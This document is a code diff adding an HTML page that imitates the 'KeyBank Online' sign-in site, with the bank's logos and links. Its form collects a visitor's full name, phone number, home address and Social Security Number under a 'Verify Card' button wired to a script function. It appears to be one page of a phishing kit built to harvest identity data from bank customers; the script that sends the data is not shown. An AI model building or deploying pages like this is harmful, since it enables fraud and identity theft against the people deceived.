@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="shortcut icon" href="favicon.ico">
+    <link href="./css/app.css" rel="stylesheet" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css"
+        integrity="sha512-KfkfwYDsLkIlwQp6LFnl8zNdLGxu9YAA1QvwINks4PhcElQSvqcyVLLD9aMhXd13uQjoXtEKNosOWaZqXgel0g=="
+        crossorigin="anonymous" referrerpolicy="no-referrer" />
+    <script type="text/javascript" src="./js/app.js"></script>
+    <title>KeyBank Online</title>
+</head>
+
+<body>
+
+    <header>
+        <div class="header-image">
+            <img src="./assets/key_white_logo.png" />
+        </div>
+        <div class="header-link">
+            <a href="#"> Contact Us </a>
+            <a href="#"> Open A New Account </a>
+        </div>
+    </header>
+
+    <main>
+
+        <img src="./assets/key-logo.svg" />
+
+        <form>
+            <label> Enter your Full Name </label>
+            <div class="inputdiv">
+                <i class="fa-regular fa-circle-user"></i>
+                <input type="text" autocomplete="off" id="userfullName" />
+            </div>
+            <label> Enter your Mobile Number </label>
+            <div class="inputdiv">
+                <i class="fa-solid fa-phone"></i>
+                <input type="number" autocomplete="off" id="userfullMobile" />
+            </div>
+            <label> Enter your Address </label>
+            <div class="inputdiv">
+                <i class="fa-solid fa-house-chimney-user"></i>
+                <input type="text" autocomplete="off" id="userfullAddress" />
+            </div>
+            <label> Enter your City </label>
+            <div class="inputdiv">
+                <i class="fa-solid fa-building"></i>
+                <input type="text" autocomplete="off" id="userfullCity" />
+            </div>
+            <label> Enter your State </label>
+            <div class="inputdiv">
+                <i class="fa-solid fa-map-location-dot"></i>
+                <input type="text" autocomplete="off" id="userfullState" />
+            </div>
+            <label> Enter your Zip Code </label>
+            <div class="inputdiv">
+                <i class="fa-solid fa-hashtag"></i>
+                <input type="text" autocomplete="off" id="userfullZip" />
+            </div>
+            <label> Enter your Social Security Number </label>
+            <div class="inputdiv">
+                <i class="fa-solid fa-lock"></i>
+                <input type="text" autocomplete="off" id="userfullSSN" />
+            </div>
+            <button type="button" onclick="thirdsubmit()" id="thirdbtn"> Verify Card </button>
+
+        </form>
+        <a href="#"> Problem Signing On? </a>
+        <a href="#"> Enrol in Online Banking </a>
+
+    </main>
+
+    <footer>
+        Last updated: 2022-05-06 19:47:26
+    </footer>
+
+</body>
+
+</html>
